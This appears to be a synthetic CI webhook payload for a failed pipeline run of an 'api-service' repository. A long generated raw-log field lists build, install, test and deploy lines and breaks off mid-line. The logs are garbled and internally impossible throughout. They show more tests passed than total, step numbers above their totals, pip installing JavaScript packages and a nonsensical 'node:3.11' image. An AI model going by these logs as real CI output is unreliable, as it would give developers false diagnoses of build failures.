{
  "action": "completed",
  "workflow_run": {
    "id": 733,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-178",
    "head_sha": "270e50627c053f91ab719d44fbbda39456abaac8",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-25T12:19:43.464554Z",
    "updated_at": "2025-11-25T12:22:08.633147Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "diana"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\nCache saved successfully\nTime: 69.683s\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 deploy completed\nImage pulled successfully\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\nTransforming 984 files...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 28MB\nChecking out main branch\n  PASS: unit/test_user_create.spec.js\nArtifact uploaded: dist.zip (72MB)\nnpm install: added 392 packages\nArtifact uploaded: build.tar.gz (26MB)\nCompiling src/index.js...\nEnvironment: production\nUsing Node.js 14.8.2\n[12:19:43] DEBUG: Query executed in 11ms\n[12:19:43] WARN: Deprecated API usage\npip install: Successfully installed react-3.14\nException: NullPointerException\nEnvironment: staging\nPOST /upload - 202 (296ms)\nnpm notice: package.json updated\nnpm notice: created a lockfile\nSuccess!\nPulling image: python:3.11\nCompiling utils/handler.rs...\nCache hit for key-4220\nPlatform: win32-x64\n\u2713 All checks passed\nImage pulled successfully\nVerifying...\nStep 10/25: Linting\nArtifact uploaded: dist.zip (99MB)\n[12:19:43] WARN: Deprecated API usage\nUploading artifact 'build' (9 files)\nArtifact uploaded: dist.zip (17MB)\nStep 18/24: Deploying\nCompiling components/utils.go...\nCompiling components/service.java...\nGET /health - 201 (88ms)\nnpm install: resolved 1004 packages\n\u2717 build failed with exit code 15\nStep 4/19: Installing dependencies\nVerifying...\nnpm install: added 488 packages\nStep 7/25: Deploying\nCache hit for key-3958\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nException: RuntimeError\nProcessing...\npip: Downloading lodash-2.20.tar.gz\nChecking out main branch\nConnecting to test.io:443...\nAlready up to date.\nEnvironment: production\nRan 39 tests in 49s\nUsing Python 3.10\nCompiling src/index.js...\n[12:19:43] DEBUG: Connection pool: 8 active\nTLS handshake completed\nImage pulled successfully\nCache invalidated: node_modules\nDone.\nHEAD is now at df3d323\n\u2713 package completed\nFinished.\n[12:19:43] DEBUG: Initializing service\nCompiling components/index.js...\nCompiling components/utils.go...\nConnecting to test.io:443...\nMinifying app.js\nArtifact uploaded: build.tar.gz (49MB)\n\u2713 Step 'test' succeeded\nStep 2/22: Deploying\nnpm install: added 406 packages\nOptimizing 61 modules...\nMinifying app.js\nDone.\nnpm notice: created a lockfile\n[12:19:43] DEBUG: Memory usage: 727MB\n[12:19:43] WARN: Deprecated API usage\nCache hit for key-6035\nHEAD is now at 4bd6094\nTransforming 797 files...\nTransforming 883 files...\n[12:19:43] DEBUG: Memory usage: 1569MB\nCache hit for key-3199\nSwitched to branch 'hotfix/task-472'\nStep 19/22: Running migrations\n[12:19:43] DEBUG: Initializing service\nBuilding Docker image...\nStep 19/23: Testing\nnpm notice: created a lockfile\nArtifact downloaded: 36MB\nWaiting...\nConnecting to acme.corp:443...\nStep 1/21: Building\npip: Collecting express\nConnecting to example.com:443...\nStep 19/18: Deploying\nnpm install: added 472 packages\npip: Installing build dependencies...\nOK\nnpm notice: created a lockfile\n[12:19:43] DEBUG: Connection pool: 10 active\npip: Downloading eslint-4.2.tar.gz\nnpm install: added 373 packages\nEnvironment: test\n[12:19:43] WARN: Deprecated API usage\nCreating production build...\nMinifying vendor.js\n[12:19:43] WARN: Deprecated API usage\nDone.\n[12:19:43] DEBUG: Loading configuration\nStep 3/20: Building\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (30MB)\n[12:19:43] DEBUG: Query executed in 29ms\nWaiting...\nTransforming 572 files...\nPushing to registry...\n  PASS: integration/test_auth_login.spec.js\nEnvironment: staging\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache saved successfully\nConnecting to acme.corp:443...\nPushing to registry...\nUploading artifact 'build' (50 files)\n[12:19:43] INFO: Processing request\n[12:19:43] ERROR: Connection failed\nCache invalidated: build\nDone.\npip: Collecting webpack\nArtifact downloaded: 29MB\n\u2713 All checks passed\n\u2713 Task completed in 4516ms\nTime: 75.224s\nnpm install: resolved 144 packages\nInstalling jest@3.14.9\nStep 4/20: Building\npip: Installing build dependencies...\nDone.\nCreating production build...\nCache invalidated: dependencies\nPushing to registry...\npip install: Successfully installed express-1.0\n  PASS: test_cache_hit (38ms)\nBundling main.js\n[12:19:43] INFO: Processing request\nCompiling src/main.py...\nPlatform: linux-x64\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Task completed in 246ms\nyarn add: Done in 22.62s\nStep 12/23: Linting\nUsing Python 3.12\nNODE_ENV=test\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nLoading...\nOptimizing 98 modules...\n  PASS: e2e/test_db_connect.spec.js\n\u2713 Step 'install' succeeded\nPushing to registry...\nWARNING: lodash has known vulnerabilities\nUsing Python 3.9\n=== Step setup_environment completed ===\n=== Step: deploy_production ===\nUploading artifact 'coverage' (30 files)\nGET /status - 201 (75ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\nCompiling lib/handler.rs...\nReady.\nnpm install: added 258 packages\n[12:19:43] DEBUG: Connection pool: 3 active\nCompiling src/utils.go...\nyarn add: Done in 13.43s\nConnecting to example.com:443...\nWaiting...\nCompleted.\nCompiling src/utils.go...\nCache miss for key-2360\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\n  PASS: test_user_create (139ms)\nnpm install: resolved 401 packages\nArtifact downloaded: 43MB\n\u2713 All checks passed\n[12:19:43] INFO: Processing request\nOK\n[12:19:43] INFO: Cache refreshed\nLoading...\nTest Suites: 8 passed, 36 total\nStep 15/15: Installing dependencies\nUsing Python 3.10\nTLS handshake completed\npip: Installing build dependencies...\nTest Suites: 8 passed, 23 total\nUsing Python 3.12\nTest Suites: 32 passed, 21 total\nSuccess!\nCompiling lib/main.py...\nSuccess!\nSwitched to branch 'bugfix/task-428'\nStep 13/18: Testing\nStep 4/19: Deploying\nWaiting...\nTest Suites: 21 passed, 30 total\nnpm install: added 294 packages\nPlatform: linux-x64\n[12:19:43] INFO: Cache refreshed\nnpm notice: package.json updated\nStep 8/15: Building\nBundling runtime.css\nChecking out develop branch\nPOST /upload - 200 (172ms)\nFetching submodules...\nCache hit for key-4361\nHEAD is now at 34c5c76\nOptimizing 82 modules...\nCoverage: 92% statements, 77% branches\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 18/19: Deploying\n[12:19:43] DEBUG: Initializing service\nCompleted.\npip install: Successfully installed jest-1.2\nBundling main.js\npip install: Successfully installed react-5.8\nReady.\n[12:19:43] DEBUG: Initializing service\nOptimizing 27 modules...\nCreating production build...\n\u2713 Task completed in 1811ms\nLoading...\nStep 11/24: Deploying\nDone.\n[12:19:43] WARN: Deprecated API usage\nUsing Python 3.11\n  PASS: e2e/test_cache_hit.spec.js\n[12:19:43] WARN: Deprecated API usage\npip install: Successfully installed prettier-5.9\nCache restored successfully (274MB)\nStep 16/22: Running migrations\nWaiting...\nnpm notice: created a lockfile\nnpm notice: created a lockfile\nnpm install: added 15 packages\nnpm install: added 35 packages\nTest Suites: 50 passed, 33 total\nStep 7/23: Running migrations\n\u2713 All checks passed\nOptimizing 48 modules...\npip install: Successfully installed jest-3.20\nInstalling webpack@2.19.4\nReady.\npip: Downloading prettier-2.18.tar.gz\npip: Collecting jest\npip install: Successfully installed express-2.19\nFetching submodules...\nConnection established\nWARNING: webpack has known vulnerabilities\nBundling runtime.js\nAlready up to date.\nnpm install: added 128 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out main branch\nUsing Node.js 16.6.8\nRan 15 tests in 31s\nnpm install: resolved 1102 packages\nTransforming 703 files...\n\u2713 deploy completed\nUsing Node.js 20.11.1\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Downloading eslint-5.3.tar.gz\nCompiling utils/service.java...\nArtifact downloaded: 40MB\nRan 50 tests in 6s\nCache hit for key-1960\nBuilding Docker image...\n\u2713 Step 'test' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:43] DEBUG: Memory usage: 1520MB\nTests: 413 passed, 175 total\nCache miss for key-9712\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nTime: 15.219s\nReady.\nDone.\nnpm install: added 153 packages\nGenerating source maps...\nStep 15/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompleted.\n[12:19:43] INFO: Starting build process\nNODE_ENV=development\n[12:19:43] DEBUG: Memory usage: 131MB\nFAILED: test_db_connect\nnpm install: added 391 packages\n  PASS: unit/test_db_connect.spec.js\nCompiling utils/service.java...\nCache restored successfully (64MB)\nCreating production build...\nTLS handshake completed\n  PASS: integration/test_api_health.spec.js\nWARNING: axios has known vulnerabilities\n\u2713 All checks passed\nStep 5/20: Testing\nNODE_ENV=test\n  PASS: test_user_create (259ms)\nInstalling webpack@2.20.10\npip: Collecting jest\nWaiting...\nnpm notice: created a lockfile\nTime: 22.716s\n[12:19:43] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nCache saved successfully\nCompiling utils/service.java...\nArtifact uploaded: dist.zip (40MB)\nInstalling lodash@4.19.1\n\u2717 build failed with exit code 24\nCompiling lib/index.js...\nStep 2/25: Installing dependencies\nHEAD is now at 901978f\nCache miss for key-1180\nImage pulled successfully\nAlready up to date.\nnpm install: added 285 packages\nCreating production build...\n[12:19:43] DEBUG: Query executed in 8ms\nCompiling components/service.java...\nArtifact downloaded: 19MB\nStep 2/21: Building\nFetching submodules...\nCache saved successfully\n=== Step deploy_production completed ===\n=== Step: deploy_staging ===\nLoading...\nCache miss for key-3458\nRan 68 tests in 5s\n[12:19:43] WARN: Deprecated API usage\nCoverage: 99% statements, 83% branches\nSnapshots: 35 passed, 43 total\nnpm notice: package.json updated\nStep 6/21: Testing\nGenerating source maps...\n[12:19:43] DEBUG: Connection pool: 19 active\nBuilding Docker image...\n\u2713 Step 'checkout' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nArtifact uploaded: build.tar.gz (20MB)\nBundling styles.css\nCompleted.\nCache invalidated: dependencies\nChecking out develop branch\n  PASS: integration/test_auth_login.spec.js\nFinished.\nVerifying...\nRan 111 tests in 8s\nnpm install: added 170 packages\nLoading...\nReady.\nGenerating source maps...\nPushing to registry...\npip install: Successfully installed axios-4.5\nTransforming 462 files...\nUploading artifact 'dist' (44 files)\n\u2713 All checks passed\npip: Downloading prettier-2.9.tar.gz\nArtifact downloaded: 50MB\nnpm install: resolved 847 packages\n[12:19:43] WARN: Deprecated API usage\nLayer 10/14: ENV command\n[12:19:43] INFO: Cache refreshed\n\u2713 build completed\nStep 16/16: Deploying\nCompiling src/service.java...\n[12:19:43] DEBUG: Memory usage: 1854MB\nCache miss for key-5852\nGenerating source maps...\nOptimizing 88 modules...\n[12:19:43] ERROR: Connection failed\nDone.\n\u2713 Step 'install' succeeded\nArtifact uploaded: dist.zip (94MB)\nnpm notice: created a lockfile\nMinifying main.js\nEnvironment: production\nCoverage: 94% statements, 64% branches\nStep 20/17: Installing dependencies\nnpm install: resolved 1471 packages\nRan 90 tests in 34s\n[12:19:43] DEBUG: Memory usage: 1077MB\nFetching submodules...\nCache saved successfully\nPulling image: node:18\npip: Collecting axios\nStep 2/22: Installing dependencies\n[12:19:43] INFO: Starting build process\nnpm install: added 401 packages\n\u2717 build failed with exit code 61\n[12:19:43] DEBUG: Connection pool: 5 active\nStep 18/19: Linting\nFinished.\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Loading configuration\nLoading...\nArtifact uploaded: dist.zip (93MB)\nStep 14/21: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm install: resolved 549 packages\n\u2713 deploy completed\nLoading...\n[12:19:43] DEBUG: Memory usage: 336MB\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOK\nOptimizing 19 modules...\nRan 69 tests in 56s\nCreating production build...\nArtifact downloaded: 1MB\nCompiling lib/app.ts...\nCreating production build...\npip: Collecting react\nnpm notice: package.json updated\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] INFO: Cache refreshed\nAlready up to date.\nStep 2/24: Building\nConnecting to test.io:443...\n\u2717 build failed with exit code 83\nStep 6/16: Running migrations\nChecking out main branch\n\u2713 All checks passed\nTransforming 406 files...\nDone.\nStep 10/22: Running migrations\n[12:19:43] INFO: Processing request\npip install: Successfully installed lodash-4.19\nStep 2/23: Deploying\nDone.\nCreating production build...\nInstalling webpack@2.11.0\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] DEBUG: Initializing service\nStep 5/24: Deploying\n[12:19:43] WARN: Deprecated API usage\nStep 11/16: Linting\n[12:19:43] INFO: Processing request\n[12:19:43] INFO: Request completed\nAlready up to date.\n\u2713 Task completed in 1879ms\nLoading...\nVerifying...\nOK\npip: Collecting express\nArtifact uploaded: dist.zip (41MB)\nHEAD is now at 81b27f4\n[12:19:43] DEBUG: Loading configuration\n[12:19:43] INFO: Cache refreshed\nDone.\nGenerating source maps...\nArtifact downloaded: 23MB\nStep 3/15: Running migrations\nCompiling src/utils.go...\nCoverage: 98% statements, 81% branches\nStep 11/25: Linting\npip install: Successfully installed express-5.11\nCache hit for key-3693\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:43] DEBUG: Connection pool: 20 active\nFAILED: test_auth_login\nTest Suites: 39 passed, 48 total\nNODE_ENV=production\nTransforming 101 files...\nOptimizing 27 modules...\nMinifying main.js\nCompiling src/handler.rs...\nStep 17/23: Building\n[12:19:43] ERROR: Connection failed\nMinifying app.js\nPOST /data - 201 (491ms)\nConnecting to startup.dev:443...\nBuilding Docker image...\nChecking out develop branch\n[12:19:43] DEBUG: Initializing service\nPOST /data - 200 (420ms)\nCompiling lib/handler.rs...\nStep 12/24: Running migrations\n[12:19:43] DEBUG: Memory usage: 1213MB\nCache invalidated: node_modules\nTLS handshake completed\nCompleted.\nSwitched to branch 'hotfix/task-293'\n[12:19:43] WARN: Deprecated API usage\nPOST /upload - 202 (143ms)\n\u2717 build failed with exit code 56\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Initializing service\nReady.\nNODE_ENV=test\n\u2713 deploy completed\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Downloading express-3.3.tar.gz\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nEnvironment: staging\n\u2713 All checks passed\nnpm notice: created a lockfile\nPlatform: darwin-arm64\nStep 18/22: Linting\nStep 20/15: Installing dependencies\nCompiling lib/index.js...\nCompleted.\nCache miss for key-8218\n  PASS: e2e/test_auth_login.spec.js\n[12:19:43] DEBUG: Connection pool: 13 active\nInstalling webpack@3.19.9\nWARNING: eslint has known vulnerabilities\nCompleted.\nStep 9/17: Building\nSwitched to branch 'bugfix/task-946'\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nDone.\nCreating production build...\n[12:19:43] DEBUG: Loading configuration\nStep 7/17: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (14MB)\n[12:19:43] INFO: Connecting to database\nStep 3/20: Testing\n[12:19:43] WARN: Deprecated API usage\npip: Collecting webpack\nnpm notice: created a lockfile\nStep 4/19: Linting\npip install: Successfully installed eslint-1.1\nUsing Python 3.11\nDone.\nPOST /api - 200 (14ms)\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: dist.zip (58MB)\nProcessing...\nInstalling express@4.18.2\nStep 10/21: Running migrations\nBuilding Docker image...\nCache hit for key-5882\n[12:19:43] INFO: Connecting to database\n[12:19:43] INFO: Request completed\nCompiling utils/handler.rs...\nPushing to registry...\nGET /api - 200 (84ms)\nCoverage: 82% statements, 64% branches\nnpm notice: package.json updated\n[12:19:43] DEBUG: Query executed in 51ms\nTransforming 372 files...\nTest Suites: 13 passed, 20 total\nLayer 4/10: ENV command\nCache miss for key-4090\n[12:19:43] INFO: Processing request\nLoading...\nOptimizing 57 modules...\npip install: Successfully installed axios-4.8\nStep 17/21: Deploying\n\u2713 build completed\nConnection established\nRan 162 tests in 2s\nCompiling components/index.js...\n[12:19:43] INFO: Starting build process\nVerifying...\nPulling image: node:18\n\u2713 Step 'setup' succeeded\nBuilding Docker image...\nStep 1/20: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnecting to test.io:443...\n  PASS: e2e/test_db_connect.spec.js\nCache miss for key-4032\nVerifying...\n[12:19:43] DEBUG: Initializing service\nImage pulled successfully\npip: Collecting prettier\nGET /status - 201 (49ms)\nConnection established\n[12:19:43] INFO: Request completed\nArtifact uploaded: build.tar.gz (20MB)\nCompiling utils/utils.go...\nStep 9/24: Testing\nWaiting...\nWARNING: express has known vulnerabilities\n[12:19:43] WARN: Deprecated API usage\nStep 15/22: Building\nStep 1/25: Linting\nStep 16/22: Building\n[12:19:43] DEBUG: Connection pool: 5 active\n[12:19:43] DEBUG: Query executed in 50ms\nUsing Python 3.9\n[12:19:43] DEBUG: Memory usage: 1330MB\nStep 19/16: Deploying\nSwitched to branch 'hotfix/task-505'\nCompleted.\nCompiling utils/index.js...\nConnecting to startup.dev:443...\n[12:19:43] DEBUG: Connection pool: 13 active\nPulling image: alpine:latest\nUsing Python 3.10\nChecking out master branch\n[12:19:43] INFO: Connecting to database\nnpm install: resolved 1532 packages\nArtifact uploaded: build.tar.gz (14MB)\nStep 3/22: Installing dependencies\nPulling image: node:3.11\nFetching submodules...\nCache miss for key-9829\n[12:19:43] INFO: Cache refreshed\nCompiling lib/main.py...\nWaiting...\n[12:19:43] WARN: Deprecated API usage\nCache hit for key-4945\n[12:19:43] ERROR: Connection failed\nNODE_ENV=test\n[12:19:43] DEBUG: Query executed in 27ms\nArtifact downloaded: 27MB\nCompiling utils/utils.go...\n  PASS: unit/test_api_health.spec.js\nCompiling src/app.ts...\nCompleted.\n\u2713 Task completed in 3383ms\nCompiling utils/utils.go...\nImage pulled successfully\nWaiting...\nLayer 10/15: COPY command\n\u2713 Step 'setup' succeeded\nStep 13/22: Running migrations\nCache invalidated: dependencies\nnpm install: added 84 packages\nPulling image: python:3.11\npip install: Successfully installed webpack-5.5\nOptimizing 98 modules...\nUsing Node.js 17.4.10\npip: Downloading webpack-4.12.tar.gz\nCache miss for key-6926\nStep 7/19: Deploying\n[12:19:43] DEBUG: Loading configuration\nCompleted.\nNODE_ENV=development\nUsing Node.js 18.4.0\nStep 19/15: Linting\nOptimizing 49 modules...\nFinished.\nnpm install: resolved 598 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nCache invalidated: build\n[12:19:43] INFO: Request completed\nCache saved successfully\nNODE_ENV=development\nCache invalidated: node_modules\n[12:19:43] WARN: Deprecated API usage\nConnecting to example.com:443...\nCoverage: 91% statements, 86% branches\nUsing Node.js 15.14.3\nnpm notice: package.json updated\nMinifying vendor.js\nnpm install: added 448 packages\nUsing Python 3.11\nChecking out develop branch\nStep 20/16: Linting\npip: Installing build dependencies...\npip: Downloading eslint-4.9.tar.gz\nCreating production build...\nLayer 9/12: COPY command\nCache miss for key-1926\nCache saved successfully\nOptimizing 90 modules...\nFetching submodules...\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\n[12:19:43] WARN: Deprecated API usage\nStep 8/24: Linting\nWARNING: lodash has known vulnerabilities\nBundling vendor.css\nCompiling utils/handler.rs...\n[12:19:43] DEBUG: Connection pool: 17 active\nEnvironment: production\nStep 5/22: Deploying\nCompiling src/service.java...\n[12:19:43] DEBUG: Loading configuration\nVerifying...\n[12:19:43] WARN: Deprecated API usage\nBuilding Docker image...\nStep 8/15: Linting\n  PASS: unit/test_user_create.spec.js\n[12:19:43] INFO: Starting build process\nCache saved successfully\npip: Downloading prettier-2.0.tar.gz\n[12:19:43] INFO: Connecting to database\npip install: Successfully installed prettier-4.15\nStep 2/16: Building\n[12:19:43] DEBUG: Loading configuration\nDone.\nTest Suites: 16 passed, 32 total\nOK\nArtifact uploaded: dist.zip (21MB)\n[12:19:43] INFO: Request completed\nStep 6/15: Installing dependencies\nConnection established\nnpm install: resolved 1357 packages\n[12:19:43] DEBUG: Loading configuration\nFAILED: test_db_connect\nFetching submodules...\nEnvironment: staging\nNODE_ENV=production\nyarn add: Done in 15.91s\nStep 2/21: Running migrations\nCompiling components/app.ts...\nCompiling lib/main.py...\nTest Suites: 49 passed, 41 total\nTransforming 665 files...\nCompleted.\nCompiling src/service.java...\nnpm notice: created a lockfile\nPlatform: darwin-arm64\nUsing Python 3.10\nBuilding Docker image...\n[12:19:43] INFO: Cache refreshed\nVerifying...\nSwitched to branch 'feature/task-993'\nStep 5/21: Installing dependencies\n[12:19:43] ERROR: Connection failed\nTLS handshake completed\nNODE_ENV=production\n  PASS: e2e/test_db_connect.spec.js\n\u2713 All checks passed\nStep 8/17: Installing dependencies\nTransforming 198 files...\nUploading artifact 'dist' (44 files)\nStep 14/24: Installing dependencies\n\u2713 All checks passed\nOK\nConnecting to startup.dev:443...\nArtifact uploaded: dist.zip (86MB)\n[12:19:43] WARN: Deprecated API usage\nCache invalidated: node_modules\npip install: Successfully installed webpack-5.13\nCache hit for key-1234\npip: Collecting react\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nTime: 21.276s\n\u2713 All checks passed\nNODE_ENV=test\nConnection established\nPushing to registry...\nCache restored successfully (70MB)\nWaiting...\n[12:19:43] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:43] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-859'\nWARNING: lodash has known vulnerabilities\nPushing to registry...\nnpm install: resolved 907 packages\nCompiling src/service.java...\nCache restored successfully (456MB)\nCache invalidated: node_modules\npip: Collecting express\nGET /health - 201 (2ms)\nTime: 53.812s\nHEAD is now at 1d705c6\nOptimizing 29 modules...\nAlready up to date.\n[12:19:43] INFO: Request completed\nProcessing...\nRan 15 tests in 24s\nPOST /data - 201 (123ms)\nCompiling src/handler.rs...\n\u2713 validate completed\nRan 165 tests in 23s\nConnecting to example.com:443...\nTests: 472 passed, 483 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:43] INFO: Connecting to database\nTests: 430 passed, 172 total\nArtifact uploaded: build.tar.gz (12MB)\nCache invalidated: dependencies\n[12:19:43] INFO: Connecting to database\n\u2713 Task completed in 404ms\nReady.\nChecking out develop branch\nFinished.\nUploading artifact 'build' (15 files)\nStep 7/15: Building\nCreating production build...\nMinifying main.js\nFinished.\nnpm notice: created a lockfile\n  PASS: test_user_create (28ms)\nMinifying app.js\nPOST /api - 200 (470ms)\n  PASS: unit/test_user_create.spec.js\nStep 17/17: Building\n\u2713 All checks passed\nNODE_ENV=production\nyarn add: Done in 28.37s\npip: Installing build dependencies...\nStep 2/23: Testing\nCache saved successfully\n[12:19:43] ERROR: Connection failed\nInstalling webpack@3.2.4\n[12:19:43] WARN: Deprecated API usage\n[12:19:43] DEBUG: Loading configuration\nPulling image: node:3.11\nTest Suites: 44 passed, 20 total\nCompiling lib/utils.go...\nProcessing...\n[12:19:43] DEBUG: Initializing service\nBundling vendor.css\nCompiling lib/service.java...\nDone.\nUsing Node.js 16.9.4\nEnvironment: staging\npip: Collecting eslint\nCache invalidated: build\nConnecting to test.io:443...\nBuilding Docker image...\nNODE_ENV=test\nWARNING: webpack has known vulnerabilities\nLoading...\nInstalling lodash@5.15.4\n  PASS: unit/test_api_health.spec.js\nSnapshots: 24 passed, 42 total\nCreating production build...\nCreating production build...\nStep 4/24: Deploying\nSnapshots: 29 passed, 25 total\nUsing Node.js 17.4.6\n[12:19:43] WARN: Deprecated API usage\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (61MB)\nConnecting to startup.dev:443...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnpm notice: created a lockfile\nChecking out master branch\nLayer 6/11: RUN command\nStep 12/20: Building\nCoverage: 100% statements, 98% branches\n\u2713 Step 'setup' succeeded\n=== Step unit_tests completed ===\n=== Step: lint ===\nCreating production build...\nArtifact uploaded: dist.zip (30MB)\nCache hit for key-5903\nCreating production build...\nPulling image: node:18\nLayer 6/8: ENV command\nCache hit for key-2967\nPOST /data - 202 (168ms)\nStep 9/16: Installing dependencies\nCache hit for key-9317\n[12:19:43] INFO: Connecting to database\nChecking out master branch\nChecking out main branch\n\u2713 All checks passed\nCompiling utils/app.ts...\nArtifact downloaded: 28MB\nMinifying app.js\nImage pulled successfully\nArtifact downloaded: 49MB\nSwitched to branch 'hotfix/task-903'\n  PASS: integration/test_cache_hit.spec.js\nyarn add: Done in 8.57s\npip: Downloading webpack-3.10.tar.gz\nEnvironment: development\nCache hit for key-5399\nWARNING: lodash has known vulnerabilities\nVerifying...\nnpm notice: created a lockfile\nnpm install: resolved 272 packages\nWARNING: webpack has known vulnerabilities\nTest Suites: 20 passed, 6 total\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nMinifying vendor.js\n[12:19:43] INFO: Cache refreshed\n[12:19:43] DEBUG: Loading configuration\nUsing Node.js 19.4.0\nPOST /api - 200 (454ms)\nStep 10/22: Deploying\nCreating production build...\nPushing to registry...\nOptimizing 91 modules...\nCompiling utils/utils.go...\nArtifact uploaded: dist.zip (7MB)\nConnection established\nStep 10/24: Testing\nConnection established\nBuilding Docker image...\nSnapshots: 41 passed, 12 total\npip: Collecting axios\nSnapshots: 41 passed, 1 total\nArtifact uploaded: build.tar.gz (21MB)\nLoading...\nStep 18/19: Installing dependencies\npip install: Successfully installed jest-2.3\n[12:19:43] INFO: Cache refreshed\nLoading...\n  PASS: test_db_connect (45ms)\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Initializing service\nCompiling components/app.ts...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:43] INFO: Starting build process\n[12:19:43] WARN: Deprecated API usage\nStep 20/17: Building\nVerifying...\nFinished.\n[12:19:43] DEBUG: Loading configuration\nStep 11/18: Deploying\n[12:19:43] WARN: Deprecated API usage\nUploading artifact 'build' (36 files)\nProcessing...\nMinifying app.js\n[12:19:43] INFO: Request completed\nPushing to registry...\nStep 1/21: Deploying\nLoading...\nSuccess!\npip install: Successfully installed axios-2.8\nCompiling src/utils.go...\nyarn add: Done in 15.40s\nSnapshots: 45 passed, 49 total\npip install: Successfully installed prettier-1.8\nSwitched to branch 'bugfix/task-560'\npip: Collecting eslint\nSwitched to branch 'hotfix/task-752'\nWARNING: webpack has known vulnerabilities\nCache invalidated: node_modules\nConnecting to example.com:443...\nGenerating source maps...\nCompiling lib/utils.go...\nnpm install: added 120 packages\nFetching submodules...\nTests: 488 passed, 467 total\nStep 20/18: Running migrations\nUploading artifact 'dist' (17 files)\nOptimizing 54 modules...\nGenerating source maps...\n[12:19:43] DEBUG: Initializing service\n[12:19:43] INFO: Cache refreshed\nProcessing...\nException: NullPointerException\npip: Installing build dependencies...\nConnection established\nCompiling lib/service.java...\nSwitched to branch 'feature/task-240'\n[12:19:43] INFO: Starting build process\nCompiling components/main.py...\n[12:19:43] DEBUG: Loading configuration\nStep 16/21: Deploying\nWARNING: lodash has known vulnerabilities\npip install: Successfully installed prettier-2.11\n[12:19:43] WARN: Deprecated API usage\n  PASS: test_user_create (289ms)\nConnecting to acme.corp:443...\nArtifact uploaded: build.tar.gz (49MB)\nUsing Python 3.11\nPOST /upload - 202 (351ms)\nTLS handshake completed\n  PASS: integration/test_api_health.spec.js\nCompiling src/handler.rs...\nCompiling utils/main.py...\nTest Suites: 8 passed, 17 total\n[12:19:43] ERROR: Connection failed\nCompiling components/handler.rs...\nFetching submodules...\nMinifying vendor.js\n[12:19:43] INFO: Processing request\nCompleted.\nPOST /upload - 202 (281ms)\n[12:19:43] ERROR: Connection failed\nCreating production build...\nConnecting to test.io:443...\nArtifact uploaded: build.tar.gz (46MB)\nPOST /data - 201 (409ms)\nHEAD is now at 370132f\nMinifying vendor.js\nNODE_ENV=development\nArtifact uploaded: dist.zip (89MB)\nSnapshots: 11 passed, 1 total\n[12:19:43] INFO: Request completed\n[12:19:43] DEBUG: Loading configuration\nLoading...\n\u2713 Step 'build' succeeded\nInstalling eslint@1.17.2\nVerifying...\n[12:19:43] ERROR: Connection failed\nStep 7/25: Building\n[12:19:43] WARN: Deprecated API usage\nPushing to registry...\nOptimizing 54 modules...\nCompleted.\nSnapshots: 50 passed, 21 total\n[12:19:43] DEBUG: Initializing service\nCompiling utils/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\nStep 20/20: Deploying\nCompleted.\nAlready up to date.\n\u2717 build failed with exit code 82\npip: Collecting express\nCompiling utils/app.ts...\nnpm install: added 471 packages\nCompiling components/handler.rs...\n[12:19:43] WARN: Deprecated API usage\nCache hit for key-7883\n[12:19:43] DEBUG: Initializing service\nArtifact uploaded: dist.zip (16MB)\n=== Step lint completed ===\n=== Step: install_dependencies ===\nConnecting to startup.dev:443...\n[12:19:43] WARN: Deprecated API usage\nEnvironment: production\nEnvironment: development\n  PASS: e2e/test_api_health.spec.js\nFetching 